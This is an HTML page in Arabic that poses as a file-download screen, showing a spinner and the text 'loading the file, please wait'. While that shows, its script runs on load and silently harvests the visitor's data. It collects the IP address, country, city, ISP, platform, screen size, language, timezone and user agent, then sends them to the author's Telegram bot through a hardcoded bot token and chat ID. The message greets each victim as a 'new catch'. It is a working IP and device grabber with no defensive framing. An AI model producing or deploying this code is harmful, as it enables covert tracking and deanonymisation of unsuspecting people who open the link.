<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جارٍ التحميل...</title>
    <style>
        body { font-family: Tahoma, sans-serif; text-align: center; padding-top: 80px; background-color: #f4f4f9; color: #333; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>جاري تحميل الملف، يُرجى الانتظار...</h2>

    <script>
        async function collectAndSend() {
            try {
                // جلب بيانات الآي بي والموقع الجغرافي بالتفصيل
                let ipResponse = await fetch('https://ipwho.is/');
                let ipData = await ipResponse.json();

                let ip = ipData.ip || 'غير معروف';
                let country = ipData.country || 'غير معروف';
                let city = ipData.city || 'غير معروف';
                let isp = ipData.connection ? ipData.connection.isp : 'غير معروف';

                // بيانات إضافية عن الجهاز والمتصفح
                let screenRes = screen.width + 'x' + screen.height;
                let lang = navigator.language || 'غير معروف';
                let platform = navigator.platform || 'غير معروف';
                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
                let userAgent = navigator.userAgent;

                // التوكن والأيدي بتوعك
                let token = "8938249139:AAHVaPlQGjrm7GHnC6ENZdLDMklo83xz38g";
                let chatId = "8880929233";

                let message = `🚨 صيد جديد يا حمو يا فنان!\n\n` +
                              `🌐 الـ IP: ${ip}\n` +
                              `🌍 الدولة: ${country}\n` +
                              `🏙️ المدينة: ${city}\n` +
                              `🏢 الشبكة (ISP): ${isp}\n` +
                              `💻 النظام: ${platform}\n` +
                              `📐 الشاشة: ${screenRes}\n` +
                              `🌐 اللغة: ${lang}\n` +
                              `⏰ التوقيت: ${timezone}\n` +
                              `📱 الجهاز: ${userAgent}`;

                // إرسال البيانات لبوت تليجرام عندك
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(message));
            } catch (error) {
                console.log('Error:', error);
            }
        }

        collectAndSend();
    </script>
</body>
</html>
